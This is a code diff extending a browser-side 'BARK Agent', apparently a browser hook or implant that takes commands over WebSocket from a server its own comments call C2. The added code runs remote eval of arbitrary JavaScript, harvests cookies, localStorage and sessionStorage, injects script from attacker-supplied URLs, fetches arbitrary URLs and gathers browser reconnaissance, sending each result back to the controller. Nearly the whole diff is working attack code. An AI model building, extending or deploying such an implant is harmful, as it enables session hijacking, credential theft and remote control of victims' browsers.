@@ -8,7 +8,7 @@
         config: {
             // Use WebSocket protocol matching the page's protocol (ws or wss)
             serverUrl: window.location.protocol === 'https:' ? 'wss:' : 'ws:' + '//localhost:8080/ws',
-            heartbeatInterval: 60000, // 1 minute
+            heartbeatInterval: 5000, // 5 seconds
             reconnectInterval: 30000, // 30 seconds
             maxReconnectAttempts: 5
         },
@@ -70,6 +70,7 @@
                 
                 // Listen for messages
                 this.socket.addEventListener('message', (event) => {
+                    this.debug("Raw message received", event.data);
                     this.handleServerMessage(event);
                 });
                 
@@ -121,62 +122,290 @@
         handleServerMessage: function(event) {
             try {
                 const message = JSON.parse(event.data);
-                console.log("[BARK Agent] Received message:", message.type);
+                console.log("[BARK Agent] Received message type:", message.type);
                 
                 switch (message.type) {
                     case "command":
-                        this.executeCommand(message.command);
+                        console.log("[BARK Agent] Command received:", message.command);
+                        
+                        // Make sure the command structure exists
+                        if (message.command && message.command.id && message.command.action) {
+                            this.executeCommand(message.command);
+                        } else {
+                            console.error("[BARK Agent] Invalid command structure:", message.command);
+                        }
                         break;
                     case "config_update":
                         this.updateConfig(message.config);
                         break;
-                    case "ping":
-                        this.sendMessage({
-                            type: "pong",
-                            agentId: this.agentId,
-                            timestamp: new Date().toISOString()
-                        });
+                    case "pong":
+                        // Simple acknowledgment of heartbeat
+                        console.log("[BARK Agent] Received pong from server");
                         break;
                     default:
                         console.log("[BARK Agent] Unhandled message type:", message.type);
                 }
             } catch (error) {
-                console.error("[BARK Agent] Error processing message:", error);
+                console.error("[BARK Agent] Error processing message:", error, "Raw data:", event.data);
+            }
+        },
+
+        debug: function(message, data) {
+            const isDebug = true; // Set to false to disable verbose logging
+            if (isDebug) {
+                if (data) {
+                    console.log(`[BARK Agent Debug] ${message}`, data);
+                } else {
+                    console.log(`[BARK Agent Debug] ${message}`);
+                }
             }
         },
         
-        // Execute commands from the server
+        // Execute commands from the server - updated to handle module.command format
         executeCommand: function(command) {
+            if (!command || !command.action) {
+                console.error("[BARK Agent] Invalid command received");
+                return;
+            }
+            
             console.log("[BARK Agent] Executing command:", command.action);
             
             try {
-                // Handle different command types
-                switch (command.action) {
-                    case "collect_data":
-                        this.collectData();
-                        break;
-                    case "eval":
-                        if (command.code) {
-                            const result = eval(command.code);
-                            this.sendMessage({
-                                type: "command_result",
-                                commandId: command.id,
-                                result: result,
-                                success: true
-                            });
-                        }
-                        break;
-                    default:
-                        console.log("[BARK Agent] Unknown command:", command.action);
+                // Parse command using the [MODULE].[COMMAND].(OPTIONAL VALUES) syntax
+                const cmd = command.action;
+                let result = null;
+                let success = false;
+                
+                // Handle basic ping command
+                if (cmd === "ping") {
+                    result = "Pong";
+                    success = true;
+                } 
+                // Handle module-based commands
+                else {
+                    // Parse command structure
+                    const parts = cmd.split('.');
+                    const module = parts[0];
+                    const action = parts[1];
+                    const params = parts.length > 2 ? parts.slice(2) : [];
+                    
+                    switch (module) {
+                        case "recon":
+                            result = this.executeReconCommand(action, params);
+                            success = true;
+                            break;
+                            
+                        case "dom":
+                            result = this.executeDomCommand(action, params);
+                            success = true;
+                            break;
+                            
+                        case "storage":
+                            result = this.executeStorageCommand(action, params);
+                            success = true;
+                            break;
+                            
+                        case "net":
+                            result = this.executeNetworkCommand(action, params);
+                            success = true;
+                            break;
+                            
+                        case "exec":
+                            try {
+                                if (action === "eval" && params.length > 0) {
+                                    // Join all params and evaluate as JavaScript
+                                    const code = params.join('.');
+                                    result = eval(code);
+                                    success = true;
+                                } else {
+                                    throw new Error("Invalid eval command");
+                                }
+                            } catch (e) {
+                                result = { error: e.toString() };
+                                success = false;
+                            }
+                            break;
+                            
+                        default:
+                            result = { error: `Unknown module: ${module}` };
+                            success = false;
+                    }
                 }
-            } catch (error) {
-                console.error("[BARK Agent] Command execution error:", error);
+                
+                // Send result back to C2
                 this.sendMessage({
                     type: "command_result",
+                    agentId: this.agentId,
                     commandId: command.id,
-                    error: error.toString(),
+                    timestamp: new Date().toISOString(),
+                    result: result,
+                    success: success
+                });
+                
+            } catch (error) {
+                console.error("[BARK Agent] Command execution error:", error);
+                
+                // Send error back to C2
+                this.sendMessage({
+                    type: "command_result",
+                    agentId: this.agentId,
+                    commandId: command.id,
+                    timestamp: new Date().toISOString(),
+                    result: { error: error.toString() },
                     success: false
                 });
+            }
+        },
+        
+        // Recon module commands
+        executeReconCommand: function(action, params) {
+            switch(action) {
+                case "browser_info":
+                    return {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        cookiesEnabled: navigator.cookieEnabled,
+                        plugins: Array.from(navigator.plugins).map(p => ({
+                            name: p.name,
+                            description: p.description,
+                            filename: p.filename
+                        }))
+                    };
+                    
+                case "capture_cookies":
+                    return this.getCookies();
+                    
+                case "screen_info":
+                    return {
+                        width: window.screen.width,
+                        height: window.screen.height,
+                        colorDepth: window.screen.colorDepth,
+                        orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
+                        devicePixelRatio: window.devicePixelRatio
+                    };
+                    
+                case "location_info":
+                    return {
+                        url: window.location.href,
+                        host: window.location.host,
+                        protocol: window.location.protocol,
+                        path: window.location.pathname,
+                        query: window.location.search,
+                        hash: window.location.hash,
+                        referrer: document.referrer
+                    };
+                    
+                default:
+                    return { error: `Unknown recon action: ${action}` };
+            }
+        },
+        
+        // DOM manipulation commands
+        executeDomCommand: function(action, params) {
+            switch(action) {
+                case "get_element":
+                    if (params.length < 1) return { error: "Selector required" };
+                    const selector = params[0];
+                    const element = document.querySelector(selector);
+                    if (!element) return { error: "Element not found" };
+                    
+                    return {
+                        tagName: element.tagName,
+                        id: element.id,
+                        className: element.className,
+                        textContent: element.textContent.substring(0, 200) // Limit text length
+                    };
+                    
+                case "get_elements":
+                    if (params.length < 1) return { error: "Selector required" };
+                    const allSelector = params[0];
+                    const elements = Array.from(document.querySelectorAll(allSelector));
+                    
+                    return elements.map(el => ({
+                        tagName: el.tagName,
+                        id: el.id,
+                        className: el.className,
+                        textContent: el.textContent.substring(0, 50) // Limit text length
+                    })).slice(0, 20); // Limit to 20 results
+                    
+                case "inject_script":
+                    if (params.length < 1) return { error: "Script URL required" };
+                    const scriptUrl = params[0];
+                    
+                    return new Promise((resolve, reject) => {
+                        const script = document.createElement('script');
+                        script.src = scriptUrl;
+                        script.onload = () => resolve({ success: true });
+                        script.onerror = () => reject({ error: "Script failed to load" });
+                        document.head.appendChild(script);
+                    });
+                    
+                default:
+                    return { error: `Unknown DOM action: ${action}` };
+            }
+        },
+        
+        // Storage commands
+        executeStorageCommand: function(action, params) {
+            switch(action) {
+                case "get_local_storage":
+                    return this.getLocalStorage();
+                    
+                case "get_session_storage":
+                    try {
+                        if (!window.sessionStorage) return { error: "SessionStorage not available" };
+                        
+                        const storage = {};
+                        for (let i = 0; i < sessionStorage.length; i++) {
+                            const key = sessionStorage.key(i);
+                            storage[key] = sessionStorage.getItem(key);
+                        }
+                        return storage;
+                    } catch (e) {
+                        return { error: e.toString() };
+                    }
+                    
+                case "set_local_storage":
+                    if (params.length < 2) return { error: "Key and value required" };
+                    try {
+                        localStorage.setItem(params[0], params[1]);
+                        return { success: true };
+                    } catch (e) {
+                        return { error: e.toString() };
+                    }
+                    
+                default:
+                    return { error: `Unknown storage action: ${action}` };
+            }
+        },
+        
+        // Network commands
+        executeNetworkCommand: function(action, params) {
+            switch(action) {
+                case "fetch":
+                    if (params.length < 1) return { error: "URL required" };
+                    const url = params[0];
+                    
+                    return new Promise((resolve, reject) => {
+                        fetch(url)
+                            .then(response => response.text())
+                            .then(data => resolve({ 
+                                success: true, 
+                                data: data.substring(0, 1000) // Limit response size
+                            }))
+                            .catch(error => reject({ error: error.toString() }));
+                    });
+                    
+                case "websocket_info":
+                    return {
+                        connected: this.socket && this.socket.readyState === WebSocket.OPEN,
+                        readyState: this.socket ? this.socket.readyState : null,
+                        url: this.config.serverUrl
+                    };
+                    
+                default:
+                    return { error: `Unknown network action: ${action}` };
             }
         },
         
@@ -209,32 +438,12 @@
             
             // Start new heartbeat interval
             this.heartbeatTimer = setInterval(() => {
-                console.log("[BARK Agent] Sending heartbeat");
                 this.sendMessage({
                     type: "heartbeat",
                     agentId: this.agentId,
                     timestamp: new Date().toISOString()
                 });
             }, this.config.heartbeatInterval);
-        },
-        
-        // Collect browser data
-        collectData: function() {
-            console.log("[BARK Agent] Collecting system data");
-            
-            const data = {
-                systemInfo: this.getSystemInfo(),
-                cookies: this.getCookies(),
-                localStorage: this.getLocalStorage(),
-                history: this.getHistory()
-            };
-            
-            this.sendMessage({
-                type: "data_collection",
-                agentId: this.agentId,
-                timestamp: new Date().toISOString(),
-                data: data
-            });
         },
         
         // Get cookies
@@ -247,14 +456,14 @@
                         return obj;
                     }, {});
             } catch (e) {
-                return {};
+                return { error: e.toString() };
             }
         },
         
         // Get localStorage content
         getLocalStorage: function() {
             try {
-                if (!window.localStorage) return {};
+                if (!window.localStorage) return { error: "LocalStorage not available" };
                 
                 const storage = {};
                 for (let i = 0; i < localStorage.length; i++) {
@@ -263,19 +472,7 @@
                 }
                 return storage;
             } catch (e) {
-                return {};
-            }
-        },
-        
-        // Get limited browser history
-        getHistory: function() {
-            try {
-                return {
-                    length: history.length,
-                    current: window.location.href,
-                };
-            } catch (e) {
-                return {};
+                return { error: e.toString() };
             }
         },
         
